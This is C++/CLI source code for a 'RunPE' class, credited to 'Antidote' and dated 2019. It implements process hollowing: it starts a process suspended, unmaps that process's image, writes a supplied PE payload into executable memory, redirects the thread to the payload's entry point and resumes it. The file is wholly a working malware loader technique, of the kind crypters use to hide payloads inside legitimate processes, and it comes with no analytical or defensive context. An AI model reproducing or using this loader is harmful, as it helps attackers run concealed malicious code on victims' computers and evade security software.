using namespace System;
using namespace System::Runtime::InteropServices;
using namespace System::Security;
using namespace System::Diagnostics;
/*
-------------
' 31/01/2019 '
-------------
|-> C++ RunPE Method
|-> Coded by Antidote
|-> Support All PE File
*/
private ref class RunPE
{
public :
	[StructLayout(LayoutKind::Sequential, Pack = 1)]
	value class STARTUP_INFORMATION
	{
	public:
		UInt32 Size;
		String ^Reserved1;
		String ^Desktop;
		String ^Title;

		[MarshalAs(UnmanagedType::ByValArray, SizeConst = 36)]
		array<Byte> ^Misc;

		IntPtr Reserved2;
		IntPtr StdInput;
		IntPtr StdOutput;
		IntPtr StdError;
	};
private:

	[StructLayout(LayoutKind::Sequential, Pack = 1)]
	value class PROCESS_INFORMATION
	{
	public:
		IntPtr ProcessHandle;
		IntPtr ThreadHandle;
		UInt32 ProcessId;
		UInt32 ThreadId;
	};


	[DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet::Unicode), SuppressUnmanagedCodeSecurity]
	static bool CreateProcess(String ^applicationName, String ^commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, UInt32 creationFlags, IntPtr environment, String ^currentDirectory, STARTUP_INFORMATION %startupInfo, PROCESS_INFORMATION %processInformation);

	[DllImport("kernel32.dll", EntryPoint = "GetThreadContext"), SuppressUnmanagedCodeSecurity]
	static bool GetThreadContext(IntPtr thread, array<int> ^context);

	[DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity]
	static bool Wow64GetThreadContext(IntPtr thread, array<int> ^context);

	[DllImport("kernel32.dll", EntryPoint = "SetThreadContext"), SuppressUnmanagedCodeSecurity]
	static bool SetThreadContext(IntPtr thread, array<int> ^context);

	[DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity]
	static bool Wow64SetThreadContext(IntPtr thread, array<int> ^context);

	[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory"), SuppressUnmanagedCodeSecurity]
	static bool ReadProcessMemory(IntPtr process, int baseAddress, int %buffer, int bufferSize, int %bytesRead);

	[DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory"), SuppressUnmanagedCodeSecurity]
	static bool WriteProcessMemory(IntPtr process, int baseAddress, array<Byte> ^buffer, int bufferSize, int %bytesWritten);

	[DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity]
	static int NtUnmapViewOfSection(IntPtr process, int baseAddress);

	[DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx"), SuppressUnmanagedCodeSecurity]
	static int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	[DllImport("kernel32.dll", EntryPoint = "ResumeThread"), SuppressUnmanagedCodeSecurity]
	static int ResumeThread(IntPtr handle);
 
public:
	static bool Run(String ^path, String ^cmd, array<Byte> ^data, bool compatible)
	{
		for (int I = 1; I <= 5; I++)
		{
			if (HandleRun(path, cmd, data, compatible))
			{
				return true;
			}
		}

		return false;
	}

private:
	static bool HandleRun(String ^path, String ^cmd, array<Byte> ^data, bool compatible)
	{
		int ReadWrite = 0;
		String ^QuotedPath = String::Format("\"{0}\"", path);

		STARTUP_INFORMATION SI = STARTUP_INFORMATION();
		PROCESS_INFORMATION PI = PROCESS_INFORMATION();

		SI.Size = Convert::ToUInt32(Marshal::SizeOf(STARTUP_INFORMATION::typeid));

		try
		{
			if (!(String::IsNullOrEmpty(cmd)))
			{
				QuotedPath = QuotedPath + " " + cmd;
			}

			if (!(CreateProcess(path, QuotedPath, IntPtr::Zero, IntPtr::Zero, false, 4, IntPtr::Zero, nullptr, SI, PI)))
			{
				throw gcnew Exception();
			}

			int FileAddress = BitConverter::ToInt32(data, 60);
			int ImageBase = BitConverter::ToInt32(data, FileAddress + 52);

			array<int> ^Context = gcnew array<int>(179);
			Context[0] = 65538;

			if (IntPtr::Size == 4)
			{
				if (!(GetThreadContext(PI.ThreadHandle, Context)))
				{
					throw gcnew Exception();
				}
			}
			else
			{
				if (!(Wow64GetThreadContext(PI.ThreadHandle, Context)))
				{
					throw gcnew Exception();
				}
			}

			int Ebx = Context[41];
			int BaseAddress = 0;

			if (!(ReadProcessMemory(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite)))
			{
				throw gcnew Exception();
			}

			if (ImageBase == BaseAddress)
			{
				if (!(NtUnmapViewOfSection(PI.ProcessHandle, BaseAddress) == 0))
				{
					throw gcnew Exception();
				}
			}

			int SizeOfImage = BitConverter::ToInt32(data, FileAddress + 80);
			int SizeOfHeaders = BitConverter::ToInt32(data, FileAddress + 84);

			bool AllowOverride = false;
			int NewImageBase = VirtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64);
 

			if (!compatible && NewImageBase == 0)
			{
				AllowOverride = true;
				NewImageBase = VirtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64);
			}

			if (NewImageBase == 0)
			{
				throw gcnew Exception();
			}

			if (!(WriteProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite)))
			{
				throw gcnew Exception();
			}

			int SectionOffset = FileAddress + 248;
			short NumberOfSections = BitConverter::ToInt16(data, FileAddress + 6);

			for (int I = 0; I < NumberOfSections; I++)
			{
				int VirtualAddress = BitConverter::ToInt32(data, SectionOffset + 12);
				int SizeOfRawData = BitConverter::ToInt32(data, SectionOffset + 16);
				int PointerToRawData = BitConverter::ToInt32(data, SectionOffset + 20);

				if (!(SizeOfRawData == 0))
				{
					array<Byte> ^SectionData = gcnew array<Byte>(SizeOfRawData);
					Buffer::BlockCopy(data, PointerToRawData, SectionData, 0, SectionData->Length);

					if (!(WriteProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData->Length, ReadWrite)))
					{
						throw gcnew Exception();
					}
				}

				SectionOffset += 40;
			}

			array<Byte> ^PointerData = BitConverter::GetBytes(NewImageBase);
			if (!(WriteProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite)))
			{
				throw gcnew Exception();
			}

			int AddressOfEntryPoint = BitConverter::ToInt32(data, FileAddress + 40);

			if (AllowOverride)
			{
				NewImageBase = ImageBase;
			}
			Context[44] = NewImageBase + AddressOfEntryPoint;

			if (IntPtr::Size == 4)
			{
				if (!(SetThreadContext(PI.ThreadHandle, Context)))
				{
					throw gcnew Exception();
				}
			}
			else
			{
				if (!(Wow64SetThreadContext(PI.ThreadHandle, Context)))
				{
					throw gcnew Exception();
				}
			}

			if (ResumeThread(PI.ThreadHandle) == -1)
			{
				throw gcnew Exception();
			}
		}
		catch (...)
		{
			Process ^P = Process::GetProcessById(Convert::ToInt32(PI.ProcessId));
			if (P != nullptr)
			{
				P->Kill();
			}

			return false;
		}

		return true;
	}

};